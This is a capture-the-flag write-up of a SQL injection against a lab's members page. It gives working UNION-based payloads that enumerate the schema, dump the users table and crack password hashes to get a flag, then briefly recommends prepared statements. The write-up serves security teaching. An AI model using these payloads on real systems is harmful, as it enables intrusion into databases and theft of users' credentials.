# Members SQL injection

Trying out different inputs we can find out information about the SQL server used, in this case by just inputting an apostrophe ' we find out the site is using MySQL which can aid us in constructing queries.

Trying `1 OR 1=1` works and displays all users. The query might look something like this on the server:

`SELECT name FROM members WHERE id = 1 OR 1=1`

Since 1=1 is always true, it returns all the data in the table.
Trying different inputs we can get information from the error messages.

`1 union select 1,2,3 from user -- -`
>Table 'Member_Sql_Injection.user' doesn't exist

The database is called Member_Sql_Injection

`1 or 1=1 UNION SELECT version(),user()--`
>First name: 5.5.44-0ubuntu0.12.04.1
Surname : borntosec@localhost

We can use this: `1 or 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables` to get information about what kind of data we can now steal from the tables. Let's try the "users" table, using the string doesn't seem to work but encoding users to hex works -> 0x7573657273

`1 or 1=1 UNION SELECT NULL,group_concat(column_name, 0x0a) FROM information_schema.columns where table_name = 0x7573657273`
>user_id,first_name,last_name,town,country,planet,Commentaire,countersign

(0x0a is hex for space, just for readability)

`1 or 1=1 UNION SELECT NULL,group_concat(town,country,planet,Commentaire,countersign) from users`
>First name: 
Surname : Honolulu AmericaEARTHAmerca !2b3366bcfd44f540e630d4dc2b9b06d9,BerlinAllemagneEarthIch spreche kein Deutsch.60e9032c586fb422e2c16dee6286cf10,MoscouRussiaEarth????? ????????????? ?????????e083b24a01c483437bcf4a9eea7c1b4d,424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28

`1 or 1=1 UNION SELECT NULL,group_concat(countersign) from users`

>2b3366bcfd44f540e630d4dc2b9b06d9,60e9032c586fb422e2c16dee6286cf10,e083b24a01c483437bcf4a9eea7c1b4d,5ff9d0165b4f92b14994e5c685cdce28

First two and last one are encrypted with MD5
>YesWeCan
oktoberfest
???
FortyTwo

>Decrypt this password -> then lower all the char. Sh256 on it and it's good !

FortyTwo has this comment so:
Sha256 on fortytwo -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

Flag: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

# Mitigation

Do not blindly enter user input into hardcoded SQL statements. Instead use a library that sanitizes and prepares SQL statements for you using the parameters a user gives.